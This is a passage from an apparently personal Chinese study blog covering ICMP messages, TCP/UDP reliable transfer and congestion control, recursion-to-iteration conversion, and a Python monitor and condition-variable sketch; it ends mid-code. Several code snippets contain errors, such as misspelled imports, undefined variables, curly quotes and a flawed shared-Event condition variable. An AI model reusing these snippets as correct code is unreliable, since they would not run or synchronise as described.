<li>源抑制：路由器发现网络拥塞，提示要降低发送速率</li>
<li>超时：TTL 超时</li>
<li>参数错误：路由器发现分组某些字段有问题</li>
<li>重定向：路由器发现这个分组不应该由它转发</li>
</ul>
</li>
<li>网络探询报文（2 种）：<ul>
<li>回声请求与应答报文。ping 基于此</li>
<li>时间戳请求与应答报文：请求获得时间戳</li>
</ul>
</li>
</ul>
<p>ICMP 报文封装到 IP 数据报中传输：<br><img src="https://i.loli.net/2020/01/30/32BVGCpILAkHbdU.png" alt="ICMP格式"></p>
<p>ICMP 报文封装了被丢弃的差错 IP 数据报的首部和前 8bytes 数据（这 8 bytes 通常为 UDP 首部或 TCP 部分首部）：<br><img src="https://i.loli.net/2020/01/30/rIVjqRGvF5Hc1N8.png" alt="ICMP数据部分"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/25/网络那些事之网络层/" data-id="ckoqstmdv001dgkupyhyha9pf" class="article-share-link">
        分享
      </a>
      
<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络层/">网络层</a></li></ul>

    </footer>

  </div>

  

  

</article>
    
    <article id="post-网络那些事之传输层" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
      

<h2 itemprop="name">
  <a class="article-title" href="/2020/01/22/网络那些事之传输层/">网络那些事之传输层</a>
</h2>



    </header>
    

    
    <div class="article-meta">
      <a href="/2020/01/22/网络那些事之传输层/" class="article-date">
  <time datetime="2020-01-22T10:39:56.000Z" itemprop="datePublished">2020-01-22</time>
</a>
      
<div class="article-category">
  <a class="article-category-link" href="/categories/计算机网络/">计算机网络</a>
</div>

    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      
      
      
      <h1 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h1><p>本层将会涉及：</p>
<ul>
<li>复用/分用</li>
<li>可靠数据传输</li>
<li>流量控制</li>
<li>拥塞控制</li>
<li>TCP/UDP</li>
</ul>
<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><p>传输层协议为运行在不同 Host 上的<strong>进程</strong>提供了一种逻辑通信机制。所谓逻辑通信，指发送方接收方像是直接通信，下面的协议是透明的。</p>
<p>传输层与网络层不同在于传输层提供进程之间逻辑通信，网络层提供主机之间逻辑通信。</p>
<h2 id="多路复用与多路分用"><a href="#多路复用与多路分用" class="headerlink" title="多路复用与多路分用"></a>多路复用与多路分用</h2><p>某层一个协议直接对应上层多个协议/实体，则需要复用/分用。</p>
<ul>
<li>多路复用：传输层从多个 socket 接收数据，进行头部封装后交给网络层。</li>
<li>多路分用：传输层从网络层接收数据，根据头部信息分发给多个 socket。</li>
</ul>
<h2 id="TCP-UDP-的多路复用分用"><a href="#TCP-UDP-的多路复用分用" class="headerlink" title="TCP/UDP 的多路复用分用"></a>TCP/UDP 的多路复用分用</h2><p>UDP socket 通过<strong>目的端口号</strong>唯一确定，来自不同客户端有相同目的端口的 UDP 报文会被发到相同的服务器 socket 上。</p>
<p>TCP socket 通过<strong>原IP，目的IP， 原端口号，目的端口号</strong>唯一确定，来自不同客户端有相同目的端口的 TCP 报文会被发到不同的服务器 socket 上。</p>
<h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><ul>
<li>复用/分用</li>
<li>错误校验（无纠错）</li>
</ul>
<p>属于<code>无连接</code>协议，提供<code>尽力而为</code>的服务。报文可能丢失，可能非按序到达。</p>
<p><img src="https://i.loli.net/2020/01/23/ubYceGtf5DmOdLH.png" alt="UDP报文格式"></p>
<p>checksum：校验和。负责错误校验。</p>
<p><img src="https://i.loli.net/2020/01/23/AL6TqEfa3YwcnVh.png" alt="计算校验和"></p>
<p><img src="https://i.loli.net/2020/01/23/3qEVYFGcfWjK1I5.png" alt="计算示例"></p>
<h3 id="为什么在传输层做链路检测"><a href="#为什么在传输层做链路检测" class="headerlink" title="为什么在传输层做链路检测"></a>为什么在传输层做链路检测</h3><p>传输层是端到端协议，不能确保这层以下的层次都有错误校验机制。因此需要在离应用层最近的这一层做错误校验。</p>
<h3 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h3><ul>
<li>延迟低（无连接）。</li>
<li>实现简单（不维护连接状态）。</li>
<li>头部开销少（只需 8bytes，而 TCP 头部需要 20bytes）。</li>
<li>没有拥塞控制，可以控制发送时间和速率。</li>
</ul>
<h2 id="可靠数据传输"><a href="#可靠数据传输" class="headerlink" title="可靠数据传输"></a>可靠数据传输</h2><p>可靠：<strong>不错（带纠错）</strong>，<strong>不丢</strong>，<strong>不乱</strong>。</p>
<h3 id="不错"><a href="#不错" class="headerlink" title="不错"></a>不错</h3><p>利用<strong>校验和</strong>检测位错误。如果有错误，尝试进行恢复。</p>
<h4 id="如何从错误中恢复"><a href="#如何从错误中恢复" class="headerlink" title="如何从错误中恢复"></a>如何从错误中恢复</h4><p><strong>确认（Acknowledgements，ACK）</strong>：接收方显示告知发送方分组已正确接收。</p>
<p><strong>NAK</strong>：接收方显示告知发送方分组错误。</p>
<p>发送方收到 NAK 后，<strong>重传</strong>分组。如果收到的 ACK/NAK 坏掉，<strong>重传</strong>分组。</p>
<h4 id="解决重传分组重复问题"><a href="#解决重传分组重复问题" class="headerlink" title="解决重传分组重复问题"></a>解决重传分组重复问题</h4><p><strong>序列号</strong>：发送方给每个分组增加序列号。接收方丢弃重复分组。</p>
<p>如果接收方用 ACK 告知最后一个正确接收分组的序列号，可以不使用 NAK。</p>
<h3 id="不丢"><a href="#不丢" class="headerlink" title="不丢"></a>不丢</h3><p>发送方等待“<strong>合理</strong>”时间，这个时间内没收到 ACK，<strong>重传</strong>分组。如果这个时间设置过短，依然能正常通信，但是会产生冗余包：</p>
<p><img src="https://i.loli.net/2020/01/23/RbD1VtK29OyFfQW.png" alt="等待时间过短"></p>
<h3 id="提高性能（不乱）"><a href="#提高性能（不乱）" class="headerlink" title="提高性能（不乱）"></a>提高性能（不乱）</h3><p>利用<strong>流水线机制</strong>与<strong>滑动窗口协议</strong>。为了实现流水线机制，我们需要：</p>
<ul>
<li>更大的<strong>序列号范围</strong></li>
<li>更大的存储空间以<strong>缓存分组</strong></li>
</ul>
<h4 id="滑动窗口协议"><a href="#滑动窗口协议" class="headerlink" title="滑动窗口协议"></a>滑动窗口协议</h4><p>窗口：允许使用的序列号范围 N。</p>
<p>滑动窗口：随着协议的运行，窗口在序列号空间内<strong>向前滑动</strong>。</p>
<p><img src="https://i.loli.net/2020/01/23/GAiYTnW2vMxeUoX.png" alt="滑动窗口"></p>
<h5 id="GBN（后退N帧）-协议"><a href="#GBN（后退N帧）-协议" class="headerlink" title="GBN（后退N帧） 协议"></a>GBN（后退N帧） 协议</h5><p>采用<strong>累积确认机制</strong>，ACK(n)：确认到序列号 n（包含n）的分组已被正确接受。为分组设置<strong>定时器</strong>。</p>
<p>超时事件Timeout(n)：重传序列号大于等于 n 的所有未确认分组。</p>
<p>发送方维护两个变量：base and nextseqnum：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextseqnum &lt; base + N) &#123;    <span class="comment">// 如果有窗口内有可用序列号</span></span><br><span class="line">    udt_send(packet[nextseqnum])    <span class="comment">// 发送编号为 nextseqnum 的数据</span></span><br><span class="line">    <span class="keyword">if</span> (base == nextseqnum)</span><br><span class="line">        start_timer;    <span class="comment">// 开始定时器</span></span><br><span class="line">    nextseqnum++;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    refuse_data(data);  <span class="comment">// 拒绝发送</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">if</span> timeout <span class="keyword">or</span> <span class="title">corrupt</span><span class="params">(rcvpkt)</span> </span>&#123; <span class="comment">// 如果超时或收到损坏的 ACK</span></span><br><span class="line">        start_timer;    <span class="comment">// 重置定时器</span></span><br><span class="line">        udt_send(data[base])</span><br><span class="line">        ...</span><br><span class="line">        udt_send(data[nextseqnum<span class="number">-1</span>])    <span class="comment">// 重传所有未确认分组</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">if</span> <span class="title">notcorrupt</span><span class="params">(rcvpkt)</span> </span>&#123; <span class="comment">// 如果正常收到 ACK</span></span><br><span class="line">    base = getacknum(rcvpkt) + <span class="number">1</span>;   <span class="comment">// 更新 base，窗口向前滑动！</span></span><br><span class="line">    <span class="keyword">if</span> (base == nextseqnum) <span class="comment">// 所有已发送分组均被正确接收</span></span><br><span class="line">        stop_timer;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        start_timer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接收方值只记住一个变量 expectedseqnum：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> !corrupt(rcvpkt) <span class="function"><span class="keyword">and</span> <span class="title">hasseqnum</span><span class="params">(rcvpkt, expectedseqnum)</span> </span>&#123; <span class="comment">// 如果正确接收分组</span></span><br><span class="line">    data = extract(rcvpkt);</span><br><span class="line">    deliver(data);  <span class="comment">// 向应用层传递数据</span></span><br><span class="line">    udt_send(expectednum, ACK, checksum);   <span class="comment">// 发送 ACK(expectedseqnum)</span></span><br><span class="line">    expectednum++;  <span class="comment">// 更新 expectedseqnum</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;    <span class="comment">// 分组损坏 or 乱序到达：直接丢弃</span></span><br><span class="line">    udt_send(expectednum, ACK, checksum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/01/23/tzYge7b6PmEK2CD.png" alt="GBN示例"></p>
<h5 id="SR（选择重传）协议"><a href="#SR（选择重传）协议" class="headerlink" title="SR（选择重传）协议"></a>SR（选择重传）协议</h5><p>接收方对每个分组<strong>单独确认</strong>，设置<strong>缓存机制</strong>，缓存乱序到达分组。发送方只重传没收到 ACK 的分组，为每个分组都设置定时器。</p>
<p>在接收方，我们也设置一个窗口：<br><img src="https://i.loli.net/2020/01/23/tROCeGoPl3svUqp.png" alt="SR发送接收窗口"></p>
<p><img src="https://i.loli.net/2020/01/23/thXiMKGmVSgLpqN.png" alt="SR发送接收分工"></p>
<h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>TCP 的可靠数据传输，<strong>既不是 GBN，也不是 SR</strong>！</p>
<ul>
<li>复用/分用</li>
<li>点对点传输</li>
<li>流水线机制</li>
<li>发送方/接收方缓存（SR）</li>
<li>双全工</li>
<li>面向连接</li>
<li>流量控制</li>
</ul>
<p><img src="https://i.loli.net/2020/01/24/wyvrUqoTia52AuN.png" alt="TCP格式"></p>
<p>序列号指 segment 中第一个字节的编号而不是 segment 的编号，建立 TCP 连接时，双方随机选择序列号。</p>
<p>ACKs 指希望收到的下一字节序列号，使用<strong>累计确认</strong>机制（GBN）。</p>
<h3 id="触发重传的事件"><a href="#触发重传的事件" class="headerlink" title="触发重传的事件"></a>触发重传的事件</h3><ul>
<li>超时</li>
<li>收到重复 ACK</li>
</ul>
<p>TCP 只使用<strong>一个计时器</strong>。</p>
<h3 id="设置定时器超时时间"><a href="#设置定时器超时时间" class="headerlink" title="设置定时器超时时间"></a>设置定时器超时时间</h3><p>SampleRTT：从段发出到收到 ACK 用时。</p>
<p>EstimatedRTT：多个 SampleRTT 加权平均值。</p>
<p>超时时间间隔（TimeoutInterval） = EstimatedRTT + 安全边界（DevRTT）</p>
<p><img src="https://i.loli.net/2020/01/24/dYT7Aiw95bBxcKN.png" alt="EstimatedRTT求值"></p>
<p><img src="https://i.loli.net/2020/01/24/HZdy1zDrj56MXFc.png" alt="DevRTT求值"></p>
<p><img src="https://i.loli.net/2020/01/24/EJGCumZoVlyWIpe.png" alt="超时时间间隔求值"></p>
<h3 id="快速重传"><a href="#快速重传" class="headerlink" title="快速重传"></a>快速重传</h3><p>通过检测多个重复的 ACK，发送方确认某个分组已经丢失。快速重传可以在定时器超时之前即进行重传。</p>
<p>如果发送方收到对某一数据的 3 个 ACK，则启动快速重传机制。</p>
<h3 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h3><p>本质上，流量控制是一种<strong>速度匹配</strong>机制。</p>
<p>接收方为 TCP 连接分配 Buffer：</p>
<p><img src="https://i.loli.net/2020/01/24/sA8wQaBl3V9PjZI.png" alt="接收方Buffer"></p>
<p>接收方通过在 Segment 头部字段将 RcvWindow 告诉发送方。发送方已发送但未接收 ACK 的数据量不超过 RcvWindow。</p>
<p>RcvWindow = 0，发送方仍然可以发送一个很小的段来更新 RcvWindow 值。</p>
<h3 id="TCP-连接管理"><a href="#TCP-连接管理" class="headerlink" title="TCP 连接管理"></a>TCP 连接管理</h3><p>三次握手：</p>
<ol>
<li>客户端发送 SYN 报文。</li>
<li>服务器发送 SYN/ACK 报文</li>
<li>客户端发送 ACK 报文，此时可以包含数据。</li>
</ol>
<p><img src="https://i.loli.net/2020/01/24/jKaRhulIT8k9D5A.png" alt="三次握手"></p>
<p>四次挥手：</p>
<ol>
<li>客户端发送 FIN 报文</li>
<li>服务器发送 ACK。发送 FIN</li>
<li>客户端收到 FIN，回复 ACK，进入等待状态（确保服务器正确关闭资源）</li>
<li>服务器收到 ACK，连接关闭</li>
</ol>
<p><img src="https://i.loli.net/2020/01/24/PV2D49ulaBKycgo.png" alt="四次挥手"></p>
<h3 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h3><p>与流量控制考虑端到端时延不同，拥塞控制是出于避免发出过多报文导致网络拥塞的考虑。如果说流量控制是小乘佛法，那么拥塞控制就是大乘佛法。</p>
<p>网络层不显式提供拥塞控制支持，端系统通过观察丢失、时延等网络行为判断是否发生拥塞。</p>
<h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>发送方设置一个变量 CongWin，动态调整变量以改变发送速率。保证：</p>
<p>LastByteSend - LastByteAcked &lt;= CongWin</p>
<p>rate = CongWin/RTT</p>
<h4 id="如何感知网络拥塞"><a href="#如何感知网络拥塞" class="headerlink" title="如何感知网络拥塞"></a>如何感知网络拥塞</h4><p>发生 Loss 事件（超时或收到 3 个重复 ACK）后，发送方调整速率。</p>
<h4 id="如何调整速率"><a href="#如何调整速率" class="headerlink" title="如何调整速率"></a>如何调整速率</h4><h5 id="加性增-乘性减（拥塞避免）"><a href="#加性增-乘性减（拥塞避免）" class="headerlink" title="加性增-乘性减（拥塞避免）"></a>加性增-乘性减（拥塞避免）</h5><p>逐渐增加发送速率，直到发生 Loss。</p>
<p>方法：AIMD（Additive Increase，Mutiplicative Decrease）：</p>
<ul>
<li>Additive Increase：每个 RTT 将 CongWin 增大一个 MSS（Max Segment Size）</li>
<li>Mutiplicative Decrease：发生 Loss 后将 CongWin 减半</li>
</ul>
<p><img src="https://i.loli.net/2020/01/25/AIB1lpe8UntPEu2.png" alt="AIMD"></p>
<h5 id="慢启动"><a href="#慢启动" class="headerlink" title="慢启动"></a>慢启动</h5><p>TCP 连接建立时，CongWin = 1。此阶段可用带宽远高于初始速率。</p>
<p>原理：每收到一个 ACK，执行 CongWin++（指数增长，<strong>每次翻倍</strong>）。记录一个变量 Threshold = CongWinSize(Loss)。CongWinSize 超过 Threshold 后由指数增长变为线性增长。</p>
<p><img src="https://i.loli.net/2020/01/25/Sw6VbWrPgDziBFX.png" alt="慢启动"></p>
<p>Loss 处理：</p>
<ul>
<li>3 个重复 ACK：CongWinSize /= 2，然后线性增长</li>
<li>Timeout：CongWinSize = 1，然后指数增长（达到 Threshold 后再线性增长）</li>
</ul>
<p><strong>Timeout 比重复 ACK 更严重！</strong></p>
<ol>
<li>CongWinSize &lt; Threshold，CongWinSize 指数增长</li>
<li>CongWinSize &gt; Threshold，CongWinSize 线性增长</li>
<li>收到 3 个重复 ACK，Threshold = CongWinSize / 2，CongWinSize /= 2（Threshold == CongWinSize）</li>
<li>发生 Timeout，Threshold = CongWinSize / 2，CongWinSize = 1</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/22/网络那些事之传输层/" data-id="ckoqstmdt001agkupqqsw5558" class="article-share-link">
        分享
      </a>
      
<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/传输层/">传输层</a></li></ul>

    </footer>

  </div>

  

  

</article>
    
    <article id="post-递归、迭代与回溯" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
      

<h2 itemprop="name">
  <a class="article-title" href="/2020/01/19/递归、迭代与回溯/">递归、迭代与回溯</a>
</h2>



    </header>
    

    
    <div class="article-meta">
      <a href="/2020/01/19/递归、迭代与回溯/" class="article-date">
  <time datetime="2020-01-19T04:46:37.000Z" itemprop="datePublished">2020-01-19</time>
</a>
      
<div class="article-category">
  <a class="article-category-link" href="/categories/数据结构/">数据结构</a>
</div>

    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      
      
      
      <h1 id="递归、迭代与回溯"><a href="#递归、迭代与回溯" class="headerlink" title="递归、迭代与回溯"></a>递归、迭代与回溯</h1><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>递归是程序执行过程函数调用自己不断压栈的过程，将一个大问题分解为若干个性质相似的小问题。一个递归模型必须包含两部分： <strong>递归体</strong> 和 <strong>递归出口</strong> 。以求解斐波那契数列为例，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fib</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> <span class="keyword">or</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> n  <span class="comment"># 递归出口</span></span><br><span class="line">    <span class="keyword">return</span> Fib(n<span class="number">-1</span>) + Fib(n<span class="number">-2</span>)  <span class="comment"># 递归体</span></span><br></pre></td></tr></table></figure>
<h2 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h2><p>递归深度过大会导致浪费系统资源，同时拖慢程序运行速度。所以，有时候我们需要把递归解法转化为非递归。</p>
<p>对于不需要回溯的问题，可用直接转换法，用中间变量来保存中间结果。这种方法在 <strong>尾递归</strong> 或 <strong>单向递归</strong> 中很常见，还是以斐波那契数列为例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fib</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">1</span>:</span><br><span class="line">        result = i + j  <span class="comment"># 用中间变量保存迭代结果</span></span><br><span class="line">        i = j</span><br><span class="line">        j = result</span><br><span class="line">        n -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<h2 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h2><p>对于不能直接求值，需要回溯的问题，利用栈保存中间结果。例如下面这个逆序输出用户输入的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> sum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">scanf</span>(“%d”, &amp;x);</span><br><span class="line">    <span class="keyword">if</span> (!x) sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> test(sum);</span><br><span class="line">    sum += x;</span><br><span class="line">    <span class="built_in">printf</span>(“%d”, um);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见这个函数不是简单的单向递归，在递归结束后还要执行一些操作。这就必须用栈来消去递归：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ditui</span><span class="params">(<span class="keyword">int</span> sum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Stack S;</span><br><span class="line">    StackInitiate(&amp;S);</span><br><span class="line">    <span class="keyword">int</span> x, e;</span><br><span class="line">    <span class="built_in">scanf</span>(“%d”, &amp;x) ;</span><br><span class="line">    <span class="keyword">while</span> (x)</span><br><span class="line">    &#123;</span><br><span class="line">        StackPush(&amp;S, x);</span><br><span class="line">        <span class="built_in">scanf</span>(“%d”, &amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    sum=<span class="number">0</span>; </span><br><span class="line">    <span class="built_in">printf</span>(“%d”, sum);</span><br><span class="line">    <span class="keyword">while</span> (StackNotEmpty(S))</span><br><span class="line">    &#123;</span><br><span class="line">        StackPop(&amp;S, &amp;e);</span><br><span class="line">        sum+=e;</span><br><span class="line">        <span class="built_in">printf</span>(“%d”, sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/19/递归、迭代与回溯/" data-id="ckoqstman000pgkups9jonbab" class="article-share-link">
        分享
      </a>
      
<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技巧/">技巧</a></li></ul>

    </footer>

  </div>

  

  

</article>
    
    <article id="post-管程" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
      

<h2 itemprop="name">
  <a class="article-title" href="/2019/10/13/管程/">管程</a>
</h2>



    </header>
    

    
    <div class="article-meta">
      <a href="/2019/10/13/管程/" class="article-date">
  <time datetime="2019-10-13T08:12:58.000Z" itemprop="datePublished">2019-10-13</time>
</a>
      
<div class="article-category">
  <a class="article-category-link" href="/categories/计算机系统/">计算机系统</a>
</div>

    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      
      
      
      <h1 id="管程"><a href="#管程" class="headerlink" title="管程"></a>管程</h1><p>管程是一种抽象概念，封装了一个锁、几个条件变量和共享资源。锁保证了某个时刻只有一个线程能进入管程，而条件变量用来控制共享资源。</p>
<h2 id="条件变量"><a href="#条件变量" class="headerlink" title="条件变量"></a>条件变量</h2><p>每个条件变量表示一种等待原因，对应一个队列，当进程由于共享资源被占用进入等待状态时，我们称其 <code>挂在</code> 某个条件变量上。</p>
<p>条件变量有一个 wait 方法和一个 signal 方法。wait 方法释放当前线程进入管程时获得的锁然后阻塞它。如果有线程挂在这个条件变量上，signal 方法会释放一个队列中的线程，否则 signal 就是一个空操作。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> threading improt Event, get_ident</span><br><span class="line"><span class="keyword">from</span> Collections improt deque</span><br><span class="line"></span><br><span class="line">event = Event()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Condition</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.waitting_value = <span class="number">0</span>  <span class="comment"># 挂在这个条件变量上的线程数目</span></span><br><span class="line">        self.queue = deque</span><br><span class="line">        <span class="keyword">global</span> event</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wait</span><span class="params">(self, lock)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        把当前线程挂在这个条件变量上</span></span><br><span class="line"><span class="string">        :param lock: 管程的锁。同一时刻只有一个线程能获得管程内的资源</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.waitting_value += <span class="number">1</span></span><br><span class="line">        self.queue.append(get_ident())</span><br><span class="line">        print(<span class="string">"Now we are in the thread: &#123;&#125;, executing wait()"</span>.format(get_ident()))</span><br><span class="line">        lock.release()  <span class="comment"># 释放当前线程的lock，让别的线程有机会被执行</span></span><br><span class="line">        event.wait()  <span class="comment"># 阻塞当前线程</span></span><br><span class="line">        lock.acquire()  <span class="comment"># 请求再次进入管程</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">signal</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        如果有线程挂在这个条件变量上，signal 选择一个唤醒；如果没有这就是个空操作</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> self.waitting_value &gt; <span class="number">0</span>:</span><br><span class="line">            self.queue.popleft()</span><br><span class="line">            print(<span class="string">"Now we are in the thread: &#123;&#125;, executing signal()"</span>.format(get_ident()))</span><br><span class="line">            event.set()  <span class="comment"># 唤醒一个线程</span></span><br><span class="line">            self.waitting_value -= <span class="number">1</span></span><br><span class="line">            event.clear()</span><br></pre></td></tr></table></figure>
<h2 id="用管程实现生产者-消费者问题"><a href="#用管程实现生产者-消费者问题" class="headerlink" title="用管程实现生产者-消费者问题"></a>用管程实现生产者-消费者问题</h2><p>问题描述：</p>
<ul>
<li>一个或多个生产者产生数据后放在缓冲区里</li>
<li>单个消费者从缓冲区里取出数据处理</li>
<li>任何时刻只有一个生产者或消费者可以访问缓冲区</li>
</ul>
<p>问题分析：</p>
<ul>
<li>任何时刻只能有一个线程操作缓冲区（互斥访问）</li>
<li>缓冲区空时，消费者必须等待生产者（条件同步）</li>
<li>缓冲区满时，生产者必须等待消费者（条件同步）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 